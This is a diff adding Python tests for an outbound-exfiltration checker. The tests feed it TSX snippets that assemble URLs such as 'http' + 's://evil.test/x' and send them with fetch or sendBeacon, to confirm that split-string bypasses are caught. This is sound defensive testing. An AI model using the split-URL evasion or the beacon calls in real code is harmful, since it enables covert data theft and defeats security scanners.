@@ -353,6 +353,105 @@ def test_double_slash_in_comments_no_false_positive():
     assert check_outbound_exfil(content, "App.tsx") is None
 
 
+# --- QA-3 Fire 114: split-URL-concat bypass ---------------------------------
+
+
+def test_fire114_exact_repro_blocks():
+    """Fire 114 empirical on-disk: `const P1 = "http"; const P2 = "s://...";
+    fetch(P1 + P2)`. Neither literal alone matches `https?://` but the
+    runtime concat produces the full URL."""
+    content = (
+        'import { useState } from "react";\n'
+        'const PART1 = "http";\n'
+        'const PART2 = "s://example-attacker.test/qa3-split114";\n'
+        'export default function App() {\n'
+        '  const [c, setC] = useState(0);\n'
+        '  const url = PART1 + PART2;\n'
+        '  return <button onClick={() => fetch(url).then(() => setC(c+1))}>+</button>;\n'
+        '}\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "BLOCKED" in err
+    assert "example-attacker.test" in err
+
+
+def test_3way_split_url_decls_blocks():
+    """Extended: `"http" + "s://" + "host/path"` across 3 declarations."""
+    content = (
+        'const P1 = "http";\n'
+        'const P2 = "s://";\n'
+        'const P3 = "evil.test/x";\n'
+        'fetch(P1 + P2 + P3);\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "evil.test" in err
+
+
+def test_inline_split_concat_folds_and_blocks_if_state_present():
+    """`const url = "http" + "s://evil.test/x"` folds to `"https://evil.test/x"`,
+    and if combined with a sendBeacon call the main scan catches it."""
+    content = (
+        'const url = "http" + "s://evil.test/x";\n'
+        'navigator.sendBeacon(url);\n'
+        # The fold only affects literal-adjacent concats. To confirm the
+        # fold runs, exercise sendBeacon on the folded URL directly.
+        'navigator.sendBeacon("http" + "s://direct-evil.test/y");\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "direct-evil.test" in err
+
+
+def test_split_url_with_localhost_passes():
+    """Legit: dev constants split across declarations that fold to localhost."""
+    content = (
+        'const SCHEME = "http";\n'
+        'const HOST = "://localhost:3000/api";\n'
+        'fetch(SCHEME + HOST);\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_split_url_private_net_passes():
+    content = (
+        'const SCHEME = "http";\n'
+        'const HOST = "://10.0.0.5/api";\n'
+        'fetch(SCHEME + HOST);\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_adjacent_non_url_decls_dont_false_positive():
+    """Two adjacent decls whose concat happens to start with a letter but
+    not form a URL pattern (no `://` in combined). Must not block."""
+    content = (
+        'const name = "Alice";\n'
+        'const greeting = " says hello";\n'
+        'console.log(name + greeting);\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_fold_does_not_corrupt_legit_string_concat():
+    """Regression: innocuous string concats (UI labels) should not alter behavior."""
+    content = (
+        'const user = "alice";\n'
+        'const label = "Hello, " + user + "!";\n'
+        'return <p>{label}</p>;\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_split_sendbeacon_literal_concat_blocks():
+    """Direct literal concat inside sendBeacon — should fold + block."""
+    content = 'navigator.sendBeacon("htt" + "ps://evil.test/b");'
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "evil.test" in err
+
+
 def test_filewrite_clean_counter_passes():
     """Sanity: a benign counter still writes fine."""
     with tempfile.TemporaryDirectory() as tmp:
